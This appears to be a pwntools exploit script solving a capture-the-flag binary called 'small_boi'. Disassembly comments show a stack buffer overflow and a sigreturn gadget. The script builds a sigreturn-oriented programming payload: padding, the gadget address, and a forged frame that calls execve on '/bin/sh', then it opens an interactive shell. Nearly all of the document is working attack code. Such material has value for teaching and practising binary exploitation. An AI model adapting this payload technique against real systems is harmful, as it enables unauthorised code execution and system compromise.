from pwn import * 


p = process("./small_boi")


'''
                             **************************************************************
                             undefined8 __stdcall FUN_0040017c(void)
             undefined8        RAX:8          <RETURN>
                             FUN_0040017c                                    XREF[3]:     004001e0, 00400218(*), 
                                                                                          _elfSectionHeaders::00000090(*)  
        0040017c 55              PUSH       RBP
        0040017d 48 89 e5        MOV        RBP,RSP
        00400180 b8 0f 00        MOV        EAX,15
                 00 00
        00400185 0f 05           SYSCALL                                                     sigreturn

                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined[16] __stdcall FUN_0040018c(void)
             undefined[16]     RDX:8,RAX:8    <RETURN>
             undefined1        Stack[-0x28]:1 buffer                                  XREF[1]:     00400190(*)  
                             FUN_0040018c                                    XREF[3]:     entry:004001b6(c), 004001e8, 
                                                                                          00400238(*)  
        0040018c 55              PUSH       RBP
        0040018d 48 89 e5        MOV        RBP,RSP
        00400190 48 8d 45 e0     LEA        RAX=>buffer,[RBP + -0x20]
        00400194 48 89 c6        MOV        RSI,RAX
        00400197 48 31 c0        XOR        RAX,RAX
        0040019a 48 31 ff        XOR        RDI,RDI
        0040019d 48 c7 c2        MOV        RDX,512
                 00 02 00 00
        004001a4 0f 05           SYSCALL                                                     read(0,buffer,512)

'''

sigreturn_addr = p64(0x40017c)
offset = 'a' * 40
'''


                             //
                             // .rodata 
                             // SHT_PROGBITS  [0x4001ca - 0x4001d1]
                             // ram: 004001ca-004001d1
                             //
                             s_/bin/sh_004001ca                              XREF[1]:     _elfSectionHeaders::000000d0(*)  
        004001ca 2f 62 69        ds         "/bin/sh"
                 6e 2f 73 
                 68 00

'''

syscall= 0x400185										#: syscall;


#realize my sigretun 
frame = SigreturnFrame(arch='amd64')
frame.rax = 59 												#execve(rdi,rsi,rdx)
frame.rdi = 0x4001ca 									#/bin/sh
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = syscall


payload = ''
payload += offset           #control RIP 
payload += sigreturn_addr   #call function that do the sigreturn
payload += str(frame)[8:]   #overwrite the sigreturn with my sigreturn - [8:] adjust to 8 bytes

p.sendline(payload)
p.interactive()
